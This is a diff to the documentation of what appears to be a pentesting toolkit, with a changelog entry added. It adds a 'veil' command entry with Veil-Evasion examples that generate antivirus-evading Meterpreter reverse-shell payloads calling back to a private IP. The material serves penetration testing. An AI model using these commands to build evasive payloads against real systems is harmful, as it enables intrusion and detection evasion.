@@ -6388,6 +6388,26 @@ be the most secure or efficient method for production code. Consider using
 a library like `requests` for HTTP operations if security and efficiency
 are concerns.
 
+## veil
+Generates payloads using Veil-Evasion with various options. Veil-Evasion is a payload creation framework
+for generating payloads that evade antivirus detection. This function checks if `Veil-Evasion` is installed
+and installs it if necessary. It then runs `Veil-Evasion` with the specified parameters to create various payloads.
+
+:param line: Not used in this implementation but reserved for future use.
+
+:returns: None
+
+Manual execution:
+To manually generate a payload using Veil-Evasion, use the following command:
+    ./Veil-Evasion.py -p <PAYLOAD> --<OPTION> <VALUE>
+
+Replace the placeholders with the desired values. For example:
+    ./Veil-Evasion.py -p python/meterpreter/rev_https LHOST=192.168.1.100 LPORT=443
+
+Example usage:
+    veil python_meterpreter_rev_https LHOST=192.168.1.100 LPORT=443
+    veil ruby_meterpreter_rev_tcp LHOST=192.168.1.100 LPORT=4444
+
 ## find_tgts
 Finds and returns a list of target hosts with port 445 open in the specified subnet.
 
@@ -6608,6 +6628,13 @@ Helper function to alternate the case of characters in a string.
 <!-- START CHANGELOG -->
 
 # Changelog
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): now tord, trace, and generatedic to generate dictionary with params \n\n Version: release/0.1.39 \n\n :D \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 7 01:41:09 2024 -0400 \n\n Hora: 1725687669
 
 
 ### Pruebas
